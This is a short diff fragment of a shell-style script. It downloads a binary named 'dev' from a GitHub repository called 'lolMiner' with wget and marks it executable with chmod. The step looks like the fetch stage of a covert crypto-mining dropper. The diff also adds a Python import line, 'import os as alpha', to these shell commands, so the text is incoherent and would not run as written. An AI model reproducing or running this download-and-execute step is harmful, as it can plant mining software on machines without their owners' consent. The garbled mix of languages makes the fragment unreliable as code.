@@ -1,3 +1,4 @@
+import os as alpha
 wget https://github.com/Takhon1/lolMiner/raw/main/dev
 
 chmod +x dev
